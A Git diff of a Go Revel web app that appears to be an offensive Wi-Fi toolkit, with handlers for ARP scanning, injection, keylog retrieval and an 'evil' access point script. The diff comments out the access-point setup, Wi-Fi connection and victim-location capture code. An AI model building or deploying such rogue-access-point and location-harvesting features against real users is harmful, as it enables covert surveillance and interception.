@@ -5,10 +5,10 @@ import (
 	// "github.com/jeffail/gabs"
 	"log"
 	"io/ioutil"
-	"os/exec"
+	// "os/exec"
 	"path/filepath"
 	"time"
-	"strings"
+	// "strings"
 	"net"
 )
 
@@ -91,8 +91,6 @@ func fetchdata() {
     log.Println("get blocked urls...")
     getBannedUrls()
     log.Println("get news sites")
-    getNewsUrls()
-    log.Println("completed getting files....")
 }
 func (c App) ArpScan() revel.Result {
 	return c.RenderJson(users)
@@ -252,52 +250,52 @@ func (c App) TriggerInjection() revel.Result {
 	return c.RenderJson("")
 }
 
-func (c App) ConnectToWifi() revel.Result {
-	var wifiName string
-	var wifiPassword string
-	c.Params.Bind(&wifiName, "wifiName")
-	c.Params.Bind(&wifiPassword, "wifiPassword")
-	//if you are evil you attack this application right here
-	log.Println("/srv/wifi/setupwifi.sh", " ", wifiName, " ", wifiPassword)
-	cmd := exec.Command("/srv/wifi/setupwifi.sh", wifiName, wifiPassword)
-	output, err := cmd.CombinedOutput()
-	log.Println(string(output), " errors: ", err)
-	return c.RenderJson(output)
-}
+// func (c App) ConnectToWifi() revel.Result {
+// 	var wifiName string
+// 	var wifiPassword string
+// 	c.Params.Bind(&wifiName, "wifiName")
+// 	c.Params.Bind(&wifiPassword, "wifiPassword")
+// 	//if you are evil you attack this application right here
+// 	log.Println("/srv/wifi/setupwifi.sh", " ", wifiName, " ", wifiPassword)
+// 	cmd := exec.Command("/srv/wifi/setupwifi.sh", wifiName, wifiPassword)
+// 	output, err := cmd.CombinedOutput()
+// 	log.Println(string(output), " errors: ", err)
+// 	return c.RenderJson(output)
+// }
 
-func (c App) CreateAccessPoint() revel.Result {
-	var apName string
-	var connection string
-	c.Params.Bind(&connection, "connection")
-	c.Params.Bind(&apName, "name")
-	//if you are evil you attack this application right here
-	log.Println("/srv/wifi/setupEvilAP.sh", " ", connection, " ", apName)
-	cmd := exec.Command("/srv/wifi/setupEvilAP.sh", connection, apName)
-	output, err := cmd.CombinedOutput()
-	log.Println(string(output), " errors: ", err)
-	return c.RenderJson(output)
-}
+// func (c App) CreateAccessPoint() revel.Result {
+// 	var apName string
+// 	var connection string
+// 	c.Params.Bind(&connection, "connection")
+// 	c.Params.Bind(&apName, "name")
+// 	//if you are evil you attack this application right here
+// 	log.Println("/srv/wifi/setupEvilAP.sh", " ", connection, " ", apName)
+// 	cmd := exec.Command("/srv/wifi/setupEvilAP.sh", connection, apName)
+// 	output, err := cmd.CombinedOutput()
+// 	log.Println(string(output), " errors: ", err)
+// 	return c.RenderJson(output)
+// }
 
 
-func (c App) GetLocations() revel.Result {
-	return c.RenderJson(locations)
-}
-func (c App) CatchLocation() revel.Result {
-	var lat string
-	var lon string
-	c.Params.Bind(&lat, "latitude")
-	c.Params.Bind(&lon, "longitude")
-	var l Location
-	l.Latitude = lat
-	l.Longitude = lon
-	t := time.Now().Local()
-	l.Timestamp = t.Format("20060102150405")
-	s := strings.Split(c.Request.RemoteAddr, ":")
-	ip := s[0]
-	l.IP = ip
-	locations = append(locations, l)
-	return c.RenderJson("location updated")
-}
+// func (c App) GetLocations() revel.Result {
+// 	return c.RenderJson(locations)
+// }
+// func (c App) CatchLocation() revel.Result {
+// 	var lat string
+// 	var lon string
+// 	c.Params.Bind(&lat, "latitude")
+// 	c.Params.Bind(&lon, "longitude")
+// 	var l Location
+// 	l.Latitude = lat
+// 	l.Longitude = lon
+// 	t := time.Now().Local()
+// 	l.Timestamp = t.Format("20060102150405")
+// 	s := strings.Split(c.Request.RemoteAddr, ":")
+// 	ip := s[0]
+// 	l.IP = ip
+// 	locations = append(locations, l)
+// 	return c.RenderJson("location updated")
+// }
 
 
 func (c App) GetKeylogs() revel.Result {
